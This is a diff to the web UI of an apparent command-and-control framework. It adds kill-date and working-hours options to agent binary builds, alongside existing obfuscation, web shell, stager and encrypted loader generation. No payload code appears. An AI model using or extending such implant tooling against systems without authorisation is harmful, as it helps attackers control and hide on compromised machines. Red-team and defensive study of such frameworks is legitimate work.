@@ -21,6 +21,8 @@ type PayloadRequest struct {
 	ListenerURL    string `json:"listener_url"`    // C2 callback URL
 	Sleep          int    `json:"sleep"`           // Agent sleep seconds
 	Jitter         int    `json:"jitter"`          // Agent jitter percentage
+	KillDate       string `json:"kill_date"`       // Optional: "2026-12-31"
+	WorkingTime    string `json:"working_time"`    // Optional: "08:00-18:00"
 	Obfuscate      bool   `json:"obfuscate"`       // Use garble (legacy boolean)
 	ObfuscateLevel string `json:"obfuscate_level"` // "none" | "strip" | "garble"
 	AppTemplate    string `json:"app_template"`    // For "app" type — template name
@@ -265,6 +267,13 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		}
 	}
 
+	if req.KillDate != "" {
+		ldflags += fmt.Sprintf(" -X '%s.KillDate=%s'", module, req.KillDate)
+	}
+	if req.WorkingTime != "" {
+		ldflags += fmt.Sprintf(" -X '%s.WorkingTime=%s'", module, req.WorkingTime)
+	}
+
 	// Add service-specific flags
 	if buildMode == "service" {
 		ldflags += fmt.Sprintf(" -X '%s.RunAsService=true'", module)
@@ -401,9 +410,9 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 // generateWebPayload creates web shells and stagers.
 func (w *WebUI) generateWebPayload(req PayloadRequest) PayloadResponse {
 	cfg := payloads.PayloadConfig{
-		Type:        payloads.PayloadType(req.Type),
-		ListenerURL: req.ListenerURL,
-		OutputPath:  "build/payloads",
+		Type:         payloads.PayloadType(req.Type),
+		ListenerURL:  req.ListenerURL,
+		OutputPath:   "build/payloads",
 		StagingToken: w.server.Config.Server.StagingToken,
 	}
 
@@ -698,8 +707,8 @@ func (w *WebUI) handleLoaderGenerate(rw http.ResponseWriter, r *http.Request) {
 		"success":           true,
 		"loader_type":       req.LoaderType,
 		"encrypted_payload": result.EncryptedPayload,
-		"key":              result.Key[:16] + "...",
-		"instructions":     result.Instructions,
+		"key":               result.Key[:16] + "...",
+		"instructions":      result.Instructions,
 	}
 
 	if result.LoaderPath != "" {
